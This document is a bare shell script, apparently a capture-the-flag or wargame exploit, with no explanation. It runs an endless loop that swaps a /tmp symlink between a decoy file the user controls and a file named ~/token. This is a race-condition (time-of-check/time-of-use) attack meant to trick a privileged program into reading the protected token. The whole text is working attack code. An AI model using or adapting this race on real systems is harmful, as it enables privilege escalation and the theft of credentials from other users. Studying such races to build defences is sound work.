#!/bin/sh

touch /tmp/root

while [ true ]; do
	ln -s /tmp/root /tmp/symlink
	rm /tmp/symlink
	ln -s ~/token /tmp/symlink
	rm /tmp/symlink
done
